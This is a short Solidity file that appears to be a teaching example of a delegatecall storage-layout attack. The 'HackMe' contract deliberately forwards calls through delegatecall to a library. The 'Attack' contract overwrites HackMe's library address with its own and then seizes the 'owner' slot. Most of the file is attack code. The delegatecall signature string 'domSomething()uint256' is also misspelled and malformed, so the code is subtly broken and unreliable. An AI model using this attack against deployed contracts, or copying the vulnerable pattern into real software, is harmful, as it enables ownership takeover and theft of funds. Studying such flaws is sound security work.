// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Lib
{
    uint public someNumber;

    function doSomething(uint _num) public{
        someNumber = _num;
    }
}

contract HackMe 
{
    address public lib;
    address public owner;
    uint public someNumber;

    constructor (address _lib) public 
    {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public
    {
        lib.delegatecall(abi.encodeWithSignature("domSomething()uint256", _num));
    }
}

contract Attack 
{
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackme;

    constructor (HackMe _hackme) public
    {
        hackme = HackMe(_hackme);
    } 

    function attack () public
    {
        hackme.doSomething(uint(address(this)));
        hackme.doSomething(1);
    }

    function doSomething(uint _num) public
    {
        owner = msg.sender;
    }
}